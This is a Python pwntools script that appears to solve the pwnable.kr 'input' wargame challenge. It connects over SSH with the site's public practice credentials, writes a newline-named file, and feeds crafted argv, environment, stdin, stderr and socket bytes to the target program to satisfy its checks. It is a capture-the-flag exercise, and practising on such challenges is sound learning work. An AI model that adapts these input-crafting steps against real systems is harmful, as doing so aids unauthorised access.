from pwn import *
import os
s =  ssh(host='pwnable.kr',user='input2',password='guest',port=2222)
#set_working_directory(wd = '/tmp/')
print s.pwd();
# s.write('/tmp/1.txt', "\x00\x0a\x00\xff") 
# s.write('/tmp/2.txt',"\x00\x0a\x02\xff")
s.write('/tmp/\x0a',"\x00"*4)
#print hex(s.download_data('/tmp//\x0a'))
arg = list('1'*100)
#print arg[0]
arg[0] = './1'
arg[ord('A')]= "\x00"
arg[ord('B')] = "\x20\x0a\x0d" 
arg[ord('C')] = "7777" 
#print arg
#print len(arg)
dic = {"\xde\xad\xbe\xef":"\xca\xfe\xba\xbe","PWD":"/tmp/"}
#print argnput2/input', '1', '1', '1', '1', '1', '1', '1', '1', '1', '', ' \n\r', '1', '1', '1', '1', '1', '1', '1', '1', '1', '1', '1', '1', '1', '1', '1', '1', '1', '1', '1', '1', '1', '1', '1', '1', '1', '1', '1', '1', '1', '1', '1', '1', '1', '1', '1', '1', '1', '1', '1', '1', '1', '1', '1', '1', '1', '1', '1', '1', '1', '1', '1', '1', '1', '1', '1', '1', '1', '1', '1', '1', '1', '1', '1', '1', '1', '1', '1', '1', '1', '1', '1', '1', '1', '1', '1', '1', '1', '1', '1', '1', '1', '1', '1', '1', '1', '1', '1', '1'])
pro = s.process(argv= arg,cwd="/tmp/",env=dic,executable='/home/input2/input',stdin="\x00\x0a\x00\xff",stderr='\x00\x0a\x02\xff')
#print pro.recv()

print pro.recv()
#time.sleep(1)
#print pro.recv()
#r = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
time.sleep(1)
#time.sleep(10)  
#rom =remote("pwnable.kr", 7777)
s.remote("pwnable.kr", 7777)
s.send("\xde\xad\xbe\xef")
print s.recv()
#pro.interactive()
print pro.recv()